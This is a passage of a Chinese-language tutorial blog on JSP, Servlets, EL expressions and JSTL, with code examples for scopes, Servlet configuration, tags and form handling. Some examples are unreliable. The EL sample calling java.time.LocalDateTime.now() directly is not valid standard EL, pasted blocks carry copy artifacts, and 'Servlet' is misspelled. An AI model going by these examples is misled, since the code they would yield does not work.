/&gt;</span><br></pre></td></tr></tbody></table></figure><p>动态包含在运行时通过JSP引擎实现，允许根据条件或用户请求来包含特定的内容。包含的内容在页面每次请求时都会被执行和合并。</p></li></ol><p>无论是静态包含还是动态包含，都可以用来引入头部、尾部、导航栏或其他在多个页面中重复的部分。需要注意的是，包含操作只是将文件的内容嵌入到页面中，而不会改变上下文中的变量或对象作用域。</p><h2 id="application"><a href="#application" class="headerlink" title="application"></a>application</h2><p><strong>Application 对象介绍</strong></p><p>在 JavaServer Pages (JSP) 中，<code>application</code> 对象是一个全局的 Servlet 上下文对象，代表整个 Web 应用程序的范围。它允许在不同的会话和请求之间共享数据，并且在整个应用程序的生命周期内保持持久性。<code>application</code> 对象的数据在所有用户之间共享，适合存储全局配置、共享资源等信息。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>setAttribute(String name, Object value)</code></td><td>将一个数据对象存储在 <code>application</code> 对象中。</td></tr><tr><td><code>getAttribute(String name)</code></td><td>通过名称从 <code>application</code> 对象中获取之前存储的数据对象。</td></tr><tr><td><code>removeAttribute(String name)</code></td><td>从 <code>application</code> 对象中移除特定名称的数据对象。</td></tr><tr><td><code>getInitParameter(String name)</code></td><td>获取应用程序的初始化参数，这些参数在 <code>web.xml</code> 文件中配置。</td></tr><tr><td><code>getInitParameterNames()</code></td><td>获取应用程序的所有初始化参数的名称。</td></tr><tr><td><code>getServletContextName()</code></td><td>获取当前 Servlet 上下文的名称。</td></tr><tr><td><code>getResource(String path)</code></td><td>获取与给定路径关联的 URL 对象，用于访问 Web 应用中的资源。</td></tr><tr><td><code>getResourceAsStream(String path)</code></td><td>获取与给定路径关联的输入流，用于读取 Web 应用中的资源。</td></tr><tr><td><code>getRequestDispatcher(String path)</code></td><td>获取一个请求分派器，用于将请求转发给其他资源。</td></tr><tr><td><code>log(String message)</code></td><td>在服务器日志中记录一条消息。</td></tr><tr><td><code>log(String message, Throwable throwable)</code></td><td>在服务器日志中记录一条消息及其相关的异常信息。</td></tr></tbody></table><p><strong>常用的 <code>application</code> 对象方法</strong>0</p><ol><li><p>**<code>setAttribute(String name, Object value)</code>**： 用于将一个数据对象存储在 <code>application</code> 对象中。可以通过名称访问存储的对象。</p><p>示例：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    application.setAttribute(<span class="string">"companyName"</span>, <span class="string">"MyCorp Inc."</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>getAttribute(String name)</code>**： 通过名称从 <code>application</code> 对象中获取之前存储的数据对象。</p><p>示例：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">companyName</span> <span class="operator">=</span> (String) application.getAttribute(<span class="string">"companyName"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>removeAttribute(String name)</code>**： 从 <code>application</code> 对象中移除特定名称的数据对象。</p><p>示例：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    application.removeAttribute(<span class="string">"companyName"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>getInitParameter(String name)</code>**： 获取应用程序的初始化参数，这些参数在 <code>web.xml</code> 文件中配置。</p><p>示例：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">databaseURL</span> <span class="operator">=</span> application.getInitParameter(<span class="string">"databaseURL"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>getServletContextName()</code>**： 获取当前 Servlet 上下文的名称。</p><p>示例：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">contextName</span> <span class="operator">=</span> application.getServletContextName();</span><br><span class="line">%&gt;</span><br></pre></td></tr></tbody></table></figure></li></ol><h2 id="JSP作用域介绍"><a href="#JSP作用域介绍" class="headerlink" title="JSP作用域介绍"></a>JSP作用域介绍</h2><p>JSP 提供了四种不同的对象作用域，它们分别是页面作用域（Page Scope）、请求作用域（Request Scope）、会话作用域（Session Scope）和应用程序作用域（Application Scope）。这些作用域具有不同的范围和大小，适用于不同的数据共享需求。</p><p><strong>页面作用域（Page Scope）</strong>：</p><ul><li><strong>范围</strong>：仅在单个 JSP 页面中有效。</li><li><strong>大小</strong>：最小，只在当前页面内共享数据。</li><li><strong>适用场景</strong>：适合存储和传递仅在页面上使用的临时数据。</li></ul><p><strong>请求作用域（Request Scope）</strong>：</p><ul><li><strong>范围</strong>：在同一次 HTTP 请求中有效，对于处理该请求的所有 JSP 页面和 Servlet 可见。</li><li><strong>大小</strong>：适中，适合在同一次请求的多个页面之间共享数据。</li><li><strong>适用场景</strong>：在请求处理过程中传递数据，如表单提交后的数据传递。</li></ul><p><strong>会话作用域（Session Scope）</strong>：</p><ul><li><strong>范围</strong>：在整个用户会话期间有效，跨多个请求和页面。</li><li><strong>大小</strong>：较大，适用于在整个用户会话中保持状态和数据。</li><li><strong>适用场景</strong>：存储用户登录状态、用户首选项、购物车等会话级别的数据。</li></ul><p><strong>应用程序作用域（Application Scope）</strong>：</p><ul><li><strong>范围</strong>：在整个 Web 应用程序生命周期内有效，对所有用户和请求可见。</li><li><strong>大小</strong>：最大，适用于全局配置、共享资源等数据。</li><li><strong>适用场景</strong>：存储全局设置、共享的数据库连接池等全局级别的数据。</li></ul><p>选择适当的作用域取决于数据的生命周期和共享范围。更小的作用域可以提高数据隔离和安全性，但可能需要更多的数据传递工作。更大的作用域可以简化数据共享，但需要注意可能的并发问题和资源消耗。根据具体需求合理选择作用域是很重要的。</p><h2 id="JavaBean"><a href="#JavaBean" class="headerlink" title="JavaBean"></a>JavaBean</h2><h1 id="8-Serviet"><a href="#8-Serviet" class="headerlink" title="8.Serviet"></a>8.Serviet</h1><h2 id="Servlet创建、配置和调用"><a href="#Servlet创建、配置和调用" class="headerlink" title="Servlet创建、配置和调用"></a>Servlet创建、配置和调用</h2><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bdqn.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletConfig;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet("/HelloServiet")</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServiet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloServiet</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException {</span><br><span class="line">        System.out.println(<span class="string">"Web运行"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> {</span><br><span class="line">        System.out.println(<span class="string">"销毁"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException {</span><br><span class="line">        System.out.println(<span class="string">"初始化"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="创建Servlet"><a href="#创建Servlet" class="headerlink" title="创建Servlet"></a>创建Servlet</h3><p>在Java Web应用程序中，创建一个Servlet可以通过以下步骤完成：</p><ol><li><strong>创建Java类</strong>: 创建一个类，继承自<code>javax.servlet.http.HttpServlet</code>。例如：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java复制代码import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class MyServlet extends HttpServlet {</span><br><span class="line">    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {</span><br><span class="line">        // 在这里编写处理GET请求的代码</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="配置Servlet"><a href="#配置Servlet" class="headerlink" title="配置Servlet"></a>配置Servlet</h3><p>要使Servlet在Web应用程序中运行，需要对其进行配置：</p><ol><li><strong>web.xml配置（传统方式）</strong>：在<code>WEB-INF</code>文件夹下的<code>web.xml</code>文件中添加Servlet的配置信息。示例：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">xml复制代码&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.MyServlet&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;MyServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/myservlet&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></tbody></table></figure><ol><li><strong>注解配置</strong>：在Servlet类上使用注解进行配置。示例：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">java复制代码import javax.servlet.annotation.WebServlet;</span><br><span class="line"></span><br><span class="line">@WebServlet("/myservlet")</span><br><span class="line">public class MyServlet extends HttpServlet {</span><br><span class="line">    // doGet 方法和其他代码</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="调用Servlet"><a href="#调用Servlet" class="headerlink" title="调用Servlet"></a>调用Servlet</h3><p>一旦Servlet已创建并配置，您可以通过浏览器或其他HTTP客户端来调用它：</p><ol><li>在浏览器中输入URL：<code>http://localhost:8080/your-web-app/myservlet</code> （请根据您的实际配置和端口号进行相应替换）</li><li>HTTP客户端编程：您可以使用Java的<code>HttpURLConnection</code>或者第三方库如Apache HttpClient来通过编程方式调用Servlet。</li></ol><h2 id="Servlet常用方法"><a href="#Servlet常用方法" class="headerlink" title="Servlet常用方法"></a>Servlet常用方法</h2><table><thead><tr><th>方法名</th><th>描述</th></tr></thead><tbody><tr><td><code>doGet()</code></td><td>处理 HTTP GET 请求，用于获取资源或执行一些无副作用的操作。</td></tr><tr><td><code>doPost()</code></td><td>处理 HTTP POST 请求，通常用于提交数据到服务器端。</td></tr><tr><td><code>doPut()</code></td><td>处理 HTTP PUT 请求，用于更新服务器上的资源。</td></tr><tr><td><code>doDelete()</code></td><td>处理 HTTP DELETE 请求，用于删除服务器上的资源。</td></tr><tr><td><code>doHead()</code></td><td>类似于 <code>doGet()</code>，但只返回响应头部信息，不返回实际数据。</td></tr><tr><td><code>doOptions()</code></td><td>处理 HTTP OPTIONS 请求，返回服务器支持的请求方法和头信息。</td></tr><tr><td><code>doTrace()</code></td><td>处理 HTTP TRACE 请求，返回服务器收到的请求信息，用于测试和诊断。</td></tr><tr><td><code>service()</code></td><td>根据请求的方法（GET、POST 等）调用适当的 <code>doXxx()</code> 方法处理请求。</td></tr><tr><td><code>init()</code></td><td>初始化方法，用于执行一些一次性的初始化操作，比如加载配置。</td></tr><tr><td><code>destroy()</code></td><td>销毁方法，在 Servlet 容器关闭时调用，用于执行一些清理操作，释放资源等。</td></tr><tr><td><code>getServletConfig()</code></td><td>获取 Servlet 的配置信息，可以用于获取初始化参数等。</td></tr><tr><td><code>getServletContext()</code></td><td>获取 Servlet 上下文，用于访问 Servlet 容器的其他功能，比如获取资源、日志等。</td></tr><tr><td><code>getInitParameter()</code></td><td>获取初始化参数的值，可以在 web.xml 中配置。</td></tr><tr><td><code>getInitParameterNames()</code></td><td>获取所有初始化参数的名称。</td></tr><tr><td><code>getServletInfo()</code></td><td>获取 Servlet 的信息，一般是版本、作者等。</td></tr><tr><td><code>getLastModified()</code></td><td>获取最后修改时间，用于实现缓存机制。</td></tr></tbody></table><h1 id="9-EL表达式（Expression-Language）介绍与基础使用"><a href="#9-EL表达式（Expression-Language）介绍与基础使用" class="headerlink" title="9.EL表达式（Expression Language）介绍与基础使用"></a>9.EL表达式（Expression Language）介绍与基础使用</h1><h2 id="什么是EL表达式？"><a href="#什么是EL表达式？" class="headerlink" title="什么是EL表达式？"></a>什么是EL表达式？</h2><p>EL表达式（Expression Language）是一种用于在JavaWeb应用中访问和操作数据的简化表达方式。它通常用于JSP（JavaServer Pages）页面中，允许开发人员在页面上直接引用和操作JavaBean中的属性，从而实现动态数据的展示和处理。</p><h2 id="EL表达式的优点"><a href="#EL表达式的优点" class="headerlink" title="EL表达式的优点"></a>EL表达式的优点</h2><ul><li><strong>简化代码</strong>：EL表达式可以帮助减少繁琐的Java代码，使页面逻辑更加清晰简洁。</li><li><strong>易读性</strong>：EL表达式的语法更接近自然语言，提高了代码的可读性。</li><li><strong>与JSP兼容</strong>：EL表达式与JSP标签配合使用，可以轻松地在JSP页面中嵌入动态数据。</li></ul><h2 id="EL表达式的基础用法"><a href="#EL表达式的基础用法" class="headerlink" title="EL表达式的基础用法"></a>EL表达式的基础用法</h2><h3 id="访问属性"><a href="#访问属性" class="headerlink" title="访问属性"></a>访问属性</h3><p>通过<code>${}</code>语法来访问JavaBean中的属性。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"c"</span> uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;EL表达式示例&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;c:set <span class="keyword">var</span>=<span class="string">"userName"</span> value=<span class="string">"John"</span> /&gt; &lt;!-- 设置一个变量 --&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;p&gt;Welcome, ${userName}!&lt;/p&gt; &lt;!-- 访问变量值 --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="执行运算"><a href="#执行运算" class="headerlink" title="执行运算"></a>执行运算</h3><p>EL表达式支持各种数学和逻辑运算。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;p&gt;Sum: ${<span class="number">5</span> + <span class="number">3</span>}&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Product: ${<span class="number">2</span> * <span class="number">4</span>}&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Is True: ${<span class="literal">true</span> &amp;&amp; <span class="literal">false</span>}&lt;/p&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h3><p>可以调用JavaBean中的方法。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;p&gt;Current Time: ${java.time.LocalDateTime.now()}&lt;/p&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="访问集合"><a href="#访问集合" class="headerlink" title="访问集合"></a>访问集合</h3><p>访问List、Map等集合类型的元素。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">"fruits"</span> value=<span class="string">"${['Apple', 'Banana', 'Orange']}"</span>/&gt;</span><br><span class="line">&lt;p&gt;Second Fruit: ${fruits[<span class="number">1</span>]}&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">"person"</span> value=<span class="string">"${{'name': 'Alice', 'age': 30}}"</span>/&gt;</span><br><span class="line">&lt;p&gt;Name: ${person[<span class="string">'name'</span>]}, Age: ${person[<span class="string">'age'</span>]}&lt;/p&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="条件判断和循环"><a href="#条件判断和循环" class="headerlink" title="条件判断和循环"></a>条件判断和循环</h3><p>使用EL表达式进行条件判断和循环。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">"${age &gt;= 18}"</span>&gt;</span><br><span class="line">    &lt;p&gt;You are an adult.&lt;/p&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:forEach items=<span class="string">"${fruits}"</span> <span class="keyword">var</span>=<span class="string">"fruit"</span>&gt;</span><br><span class="line">    &lt;p&gt;${fruit}&lt;/p&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>EL表达式是一种简化访问和操作数据的方式，可以在JSP页面中轻松地引用JavaBean的属性和方法。它的简洁语法和强大功能使得在Web开发中更加便捷和高效。</p><h1 id="10-JSTL-JavaServer-Pages-Standard-Tag-Library-简介与基础使用"><a href="#10-JSTL-JavaServer-Pages-Standard-Tag-Library-简介与基础使用" class="headerlink" title="10.JSTL (JavaServer Pages Standard Tag Library) 简介与基础使用"></a>10.JSTL (JavaServer Pages Standard Tag Library) 简介与基础使用</h1><h2 id="什么是-JSTL？"><a href="#什么是-JSTL？" class="headerlink" title="什么是 JSTL？"></a>什么是 JSTL？</h2><p>JavaServer Pages Standard Tag Library (JSTL) 是一组用于在 JSP 页面中执行通用任务的标签集合。它提供了一种在 JSP 页面中编写更简洁、易于维护的代码的方式，同时还有助于将页面逻辑和显示分离开来。JSTL 包含多个标签库，每个库都专注于不同的任务。</p><h2 id="JSTL-的核心标签库"><a href="#JSTL-的核心标签库" class="headerlink" title="JSTL 的核心标签库"></a>JSTL 的核心标签库</h2><p>JSTL 核心标签库提供了基本的控制结构和变量处理功能。</p><h3 id="1"><a href="#1" class="headerlink" title="1. <c:out>"></a>1. <code>&lt;c:out&gt;</code></h3><p>用于在页面中输出变量值，可以防止 HTML 和 JavaScript 注入攻击。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:out value=<span class="string">"${variable}"</span> /&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="2"><a href="#2" class="headerlink" title="2. <c:set>"></a>2. <code>&lt;c:set&gt;</code></h3><p>用于设置变量值。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">"count"</span> value=<span class="string">"10"</span> /&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3. <c:if>"></a>3. <code>&lt;c:if&gt;</code></h3><p>条件判断标签，根据表达式的值决定是否执行其中的内容。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">"${age &gt; 18}"</span>&gt;</span><br><span class="line">    &lt;!-- 在年龄大于 <span class="number">18</span> 时显示的内容 --&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4. <c:choose>, <c:when>, <c:otherwise>"></a>4. <code>&lt;c:choose&gt;</code>, <code>&lt;c:when&gt;</code>, <code>&lt;c:otherwise&gt;</code></h3><p>类似于 Java 中的 switch 语句，根据条件执行不同的分支。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">"${day == 'Monday'}"</span>&gt;</span><br><span class="line">        &lt;!-- 星期一的处理 --&gt;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">"${day == 'Tuesday'}"</span>&gt;</span><br><span class="line">        &lt;!-- 星期二的处理 --&gt;</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:otherwise&gt;</span><br><span class="line">        &lt;!-- 其他情况的处理 --&gt;</span><br><span class="line">    &lt;/c:otherwise&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5. <c:forEach>"></a>5. <code>&lt;c:forEach&gt;</code></h3><p>用于循环迭代集合或数组。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:forEach items=<span class="string">"${products}"</span> <span class="keyword">var</span>=<span class="string">"product"</span>&gt;</span><br><span class="line">    &lt;!-- 对每个产品执行的操作 --&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="6"><a href="#6" class="headerlink" title="6. <c:url>"></a>6. <code>&lt;c:url&gt;</code></h3><p>用于生成带有参数的 URL。</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;c:url value=<span class="string">"/productDetails.jsp"</span>&gt;</span><br><span class="line">    &lt;c:param name=<span class="string">"productId"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">&lt;/c:url&gt;</span><br></pre></td></tr></tbody></table></figure><h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>下面是一个简单的示例，展示如何在 JSP 页面中使用 JSTL 标签库来输出一个集合中的用户列表：</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">"c"</span> uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;User List&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;User List&lt;/h1&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;c:forEach items=<span class="string">"${users}"</span> <span class="keyword">var</span>=<span class="string">"user"</span>&gt;</span><br><span class="line">            &lt;li&gt;&lt;c:out value=<span class="string">"${user}"</span> /&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/c:forEach&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure><p>在上述示例中，<code>${users}</code> 是一个从后端传递到前端的用户列表，<code>&lt;c:forEach&gt;</code> 标签用于循环遍历列表中的每个用户，并使用 <code>&lt;c:out&gt;</code> 标签输出用户信息。</p><p>这只是 JSTL 的基础使用介绍，它还有其他标签库，如格式化标签库、XML 标签库等，可以根据不同的需求进行学习和使用。</p><h2 id="更容易理解的例子"><a href="#更容易理解的例子" class="headerlink" title="更容易理解的例子"></a>更容易理解的例子</h2><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">"c"</span> uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> %&gt;</span><br><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: Administrator</span><br><span class="line">  Date: <span class="number">2023</span>/<span class="number">8</span>/<span class="number">28</span></span><br><span class="line">  Time: <span class="number">14</span>:<span class="number">39</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;数据展示&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=<span class="string">"1"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;id&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;name&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;price&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;dese&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;状态&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;c:forEach items=<span class="string">"${list}"</span> <span class="keyword">var</span>=<span class="string">"m"</span> varStatus=<span class="string">"status"</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;${m.id}&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;${m.product_name}&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;${m.product_price}&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;${m.product_desc}&lt;/td&gt;</span><br><span class="line">        &lt;c:set <span class="keyword">var</span>=<span class="string">"flag"</span> value=<span class="string">"${m.flag}"</span>&gt;&lt;/c:set&gt;</span><br><span class="line">        &lt;c:<span class="keyword">if</span> test=<span class="string">"${flag &lt; 1}"</span>&gt;</span><br><span class="line">            &lt;td&gt;上架&lt;/td&gt;</span><br><span class="line">        &lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line">        &lt;c:<span class="keyword">if</span> test=<span class="string">"${flag &gt; 1}"</span>&gt;</span><br><span class="line">            &lt;td&gt;下架&lt;/td&gt;</span><br><span class="line">        &lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;script src=<span class="string">"js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="11-tomcat链接数据库"><a href="#11-tomcat链接数据库" class="headerlink" title="11.tomcat链接数据库"></a>11.tomcat链接数据库</h1><h2 id="请求传值"><a href="#请求传值" class="headerlink" title="请求传值"></a>请求传值</h2><p>通过超链接能够向java Service发值，然后用request.getParameter();进行接收</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;button&gt;&lt;a href=<span class="string">"Stu?flag=Del&amp;xid=${stu.sid}"</span>&gt;删除&lt;/a&gt;&lt;/button&gt;</span><br></pre></td></tr></tbody></table></figure><p>Java接收</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> request.getParameter(<span class="string">"flag"</span>);</span><br></pre></td></tr></tbody></table></figure><h2 id="提交表单传值"><a href="#提交表单传值" class="headerlink" title="提交表单传值"></a>提交表单传值</h2><p>通过提交from表单可以将表单的值全部传递到Java接收，照理同样用request.getParameter();进行接收</p><figure class="highlight jsp"><table><tbody><tr><td class="code"><pre><span class="line">&lt;form method=<span class="string">"post"</span> action=<span class="string">"Stu"</span>&gt;</span><br><span class="line">    &lt;c:forEach items=<span class="string">"${liststu}"</span> <span class="keyword">var</span>=<span class="string">"stu"</span> varStatus=<span class="string">"status"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"xid"</span> value=<span class="string">"${stu.sid}"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"flag"</span> value=<span class="string">"upDate"</span>&gt;</span><br><span class="line">        &lt;p&gt;名字: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sname}"</span> name=<span class="string">"xname"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;性别: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sgender}"</span> name=<span class="string">"xgender"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;年龄: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.sage}"</span> name=<span class="string">"xage"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;地址: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.saddress}"</span> name=<span class="string">"xaddress"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;邮箱: &lt;input type=<span class="string">"text"</span> value=<span class="string">"${stu.semail}"</span> name=<span class="string">"xemail"</span>&gt;&lt;/p&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> value=<span class="string">"更改"</span>&gt;</span><br><span class="line">        &lt;button&gt;&lt;a href=<span class="string">"Stu?flag=Del&amp;xid=${stu.sid}"</span>&gt;删除&lt;/a&gt;&lt;/button&gt;</span><br><span class="line">    &lt;/c:forEach&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></tbody></table></figure><p>Java接收</p><figure class="highlight java"><table><tbody><tr><td 